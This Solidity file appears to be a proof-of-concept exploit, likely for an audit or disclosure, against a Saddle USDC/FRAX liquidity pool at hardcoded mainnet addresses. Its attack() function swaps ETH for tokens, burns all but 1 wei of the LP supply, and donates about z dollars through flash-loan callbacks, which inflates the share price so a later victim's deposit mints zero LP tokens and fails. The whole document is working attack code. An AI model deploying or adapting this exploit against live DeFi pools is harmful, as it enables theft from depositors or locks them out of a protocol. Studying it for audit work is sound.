// SPDX-License-Identifier: MIT

pragma solidity =0.8.7;

interface IERC20 {
    function transfer(address dst, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);
}

interface SaddlePool is IERC20 {
    function addLiquidity(
        uint256[] calldata amounts,
        uint256 minToMint,
        uint256 deadline
    ) external returns (uint256);

    function removeLiquidity(
        uint256 amount,
        uint256[] calldata mintAmounts,
        uint256 deadline
    ) external returns (uint256[2] calldata);

    // initialA uint256, futureA uint256, initialATime uint256, futureATime uint256, swapFee uint256, adminFee uint256, lpToken address
    function swapStorage()
        external
        view
        returns (
            uint256 initialA,
            uint256 futureA,
            uint256 initialATime,
            uint256 futureATime,
            uint256 swapFee,
            uint256 adminFee,
            address lpToken
        );

    function calculateTokenAmount(uint256[] calldata amounts, bool deposit)
        external
        view
        returns (uint256);

    function flashLoan(
        address receiver,
        IERC20 token,
        uint256 amount,
        bytes memory params
    ) external payable;

    function getVirtualPrice() external view returns (uint256);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address pool,
        IERC20 token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external;
}

interface IUniswapV2Router02 is IFlashLoanReceiver {
    function WETH() external returns (address);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract SaddlePOC {
    IERC20 public constant token0 =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); //USDC
    IERC20 public constant token1 =
        IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e); //FRAX
    SaddlePool public constant saddlePool =
        SaddlePool(0x13Cc34Aa8037f722405285AD2C82FE570bfa2bdc); //Swap (Saddle USDC/FRAX LP)

    uint256 public constant z = 10_000 ether; // this number is controlled by the attacker. They will manipulate this exactly so that they can extract maxmum value from the first depositor.

    constructor() payable {
        require(
            msg.value >= 100 ether,
            "give me some eth to buy FRAX and USDC"
        );
    }

    function setup() internal {
        IUniswapV2Router02 uniswapV2Router02 = IUniswapV2Router02(
            0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F
        ); //sushiswap router

        uint256 amount = 50 ether;
        address WETH = uniswapV2Router02.WETH();
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(token0);

        uniswapV2Router02.swapExactETHForTokens{value: amount}(
            0,
            path,
            address(this),
            block.timestamp
        );
        path[1] = address(token1);
        uniswapV2Router02.swapExactETHForTokens{value: amount}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getLPToken(SaddlePool _saddlePool)
        internal
        view
        returns (IERC20 lpToken)
    {
        (, , , , , , address _lpToken) = _saddlePool.swapStorage();
        return IERC20(_lpToken);
    }

    function addLiquidity(
        IERC20 _token0,
        IERC20 _token1,
        uint256 _amount0,
        uint256 _amount1,
        SaddlePool _saddlePool
    ) internal returns (uint256) {
        _amount0 = getTokenAmountInItsDecimals(_token0, _amount0);
        _amount1 = getTokenAmountInItsDecimals(_token1, _amount1);

        _token0.approve(address(_saddlePool), _amount0);
        _token1.approve(address(_saddlePool), _amount1);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _amount0;
        amounts[1] = _amount1;
        return _saddlePool.addLiquidity(amounts, 0, block.timestamp);
    }

    function removeLiquidityAllBut1Wei(SaddlePool _saddlePool) internal {
        IERC20 lpToken = getLPToken(_saddlePool);
        uint256 lpTokenBalance = lpToken.balanceOf(address(this));
        getLPToken(_saddlePool).approve(
            address(saddlePool),
            lpTokenBalance - 1
        );
        uint256[] memory amounts = new uint256[](2);
        saddlePool.removeLiquidity(
            lpTokenBalance - 1,
            amounts,
            block.timestamp
        );
        assert(getLPToken(_saddlePool).balanceOf(address(this)) == 1); //only 1 wei of LP token left
    }

    function calculateTokenAmount(
        IERC20 _token0,
        IERC20 _token1,
        uint256 _amount0,
        uint256 _amount1,
        SaddlePool _saddlePool
    ) internal view returns (uint256) {
        _amount0 = getTokenAmountInItsDecimals(_token0, _amount0);
        _amount1 = getTokenAmountInItsDecimals(_token1, _amount1);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _amount0;
        amounts[1] = _amount1;
        return _saddlePool.calculateTokenAmount(amounts, true);
    }

    function attack() public {
        setup();
        require(
            getLPToken(saddlePool).totalSupply() == 0,
            "attack only possible when totalSupply of pool token is zero"
        );

        //mint some saddle LP tokens
        uint256 initialAmount = 1 ether; //1$
        addLiquidity(token0, token1, initialAmount, initialAmount, saddlePool);
        removeLiquidityAllBut1Wei(saddlePool);

        //donate tokens via flashloan
        token0.transfer(address(saddlePool), 10000); //to avoid "amount is small for a flashLoan" error
        token1.transfer(address(saddlePool), 10000); //Attacker looses this but it's just <= 0.01$

        saddlePool.flashLoan(address(this), token0, 10000, "");
        saddlePool.flashLoan(address(this), token1, 10000, "");

        //this makes 1 wei of LP token worth ~z dollars
        // If someone tries to add liquitiy with less than z dollars then they will get back 0 LP tokens which is not allowed
        uint256 lpTokenThatWillbeMinted = calculateTokenAmount(
            token0,
            token1,
            z / 3,
            z / 3,
            saddlePool
        );
        assert(lpTokenThatWillbeMinted == 0);
    }

    function victimInteraction() external {
        //this fails with LPToken: cannot mint 0
        addLiquidity(token0, token1, z / 3, z / 3, saddlePool);
    }

    function executeOperation(
        address,
        IERC20 token,
        uint256,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(saddlePool), "only saddlePool callowed");
        require(
            token == token0 || token == token1,
            "only token0 and token1 allowed"
        );
        //donate z/2 + z/2 worth of dollars to the pool
        IERC20(token).transfer(
            msg.sender,
            getTokenAmountInItsDecimals(token, z / 2)
        );
    }

    function getTokenAmountInItsDecimals(IERC20 _token, uint256 _amount)
        internal
        view
        returns (uint256)
    {
        return _amount / (10**(18 - _token.decimals()));
    }
}
